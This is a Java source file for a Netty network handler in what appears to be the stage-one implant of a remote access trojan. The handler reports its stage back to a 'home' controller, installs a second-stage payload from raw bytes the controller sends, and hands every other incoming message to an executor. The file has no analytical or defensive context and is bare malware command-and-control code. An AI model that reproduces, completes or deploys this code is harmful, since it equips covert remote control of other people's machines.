package subterranean.crimson.permajar.stage1.network;

import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

import java.io.IOException;

import subterranean.crimson.permajar.stage1.PermaJar;
import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.permajar.stage2.Executor;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.containers.Message;

public class Handler extends ChannelInboundHandlerAdapter {

	private ChannelHandlerContext context;

	@Override
	public void channelActive(ChannelHandlerContext ctx) {
		// channel is now active
		Logger.add("Channel is now active");
		context = ctx;
	}

	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) {
		if (!(msg instanceof Message)) {
			return;
		}

		Message m = (Message) msg;
		if (m.getName() == -125) {
			// stage query
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), PermaJar.isStage2() ? 2 : 1));
		} else if (m.getName() == -124) {
			// stage send
			Stage1.installStage2((byte[]) m.auxObject[0]);

		} else {
			Executor.execute(m);
		}

	}

	@Override
	public void channelReadComplete(ChannelHandlerContext ctx) {
		ctx.flush();
	}

	@Override
	public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
		if (cause instanceof IOException) {
			// the connection was closed by the remote host
			Communications.disconnect();
		} else {
			cause.printStackTrace();
		}
		ctx.close();
	}

	public void send(Message m) {

		context.write(m);
		context.flush();
	}
}
